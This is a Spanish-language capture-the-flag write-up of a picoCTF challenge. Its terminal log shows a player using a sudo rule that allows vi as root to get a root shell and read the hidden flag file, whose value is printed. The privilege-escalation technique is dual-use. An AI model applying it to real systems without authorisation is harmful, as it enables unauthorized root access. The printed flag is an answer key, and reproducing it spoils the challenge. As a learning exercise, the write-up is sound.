## Descripción
```
Can you read files in the root file?

Additional details will be available after launching your challenge instance.
```
## Solución
```
porti_04@DESKTOP-8HT902T:~$ ssh -p 56801 picoplayer@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:56801 ([13.59.203.175]:56801)' can't be established.
ED25519 key fingerprint is SHA256:HKm/Bw1C+mhj23vO8tXULrgLFYvzP6gQH2IwgUiQTok.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:12: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? Yes
Warning: Permanently added '[saturn.picoctf.net]:56801' (ED25519) to the list of known hosts.
picoplayer@saturn.picoctf.net's password:
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.5.0-1023-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

picoplayer@challenge:~$ whoami
picoplayer
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer:
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$ sudo vi test

root@challenge:/home/picoplayer# whoami
root
root@challenge:/home/picoplayer# cd /root/
root@challenge:~# ls
root@challenge:~# ls -la
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Sep 18 04:06 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
root@challenge:~# car .flag.txt
bash: car: command not found
root@challenge:~# cat .flag.txt
picoCTF{uS1ng_v1m_3dit0r_ad091ce1}
root@challenge:~# Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.
porti_04@DESKTOP-8HT902T:~$
```

## Notas 
El comando **`sudo vi test`** ejecuta el editor de texto `vi` con permisos de superusuario (root) para editar o crear un archivo llamado `test`.
### Desglose:
- **`sudo`**: Ejecuta el comando con privilegios de superusuario, permitiendo modificar archivos que requieran permisos elevados.
- **`vi`**: Inicia el editor de texto `vi`, un editor de texto en modo terminal.
- **`test`**: Es el nombre del archivo que se va a abrir o crear. Si el archivo no existe, se creará uno nuevo llamado `test`.

## Referencias
````

```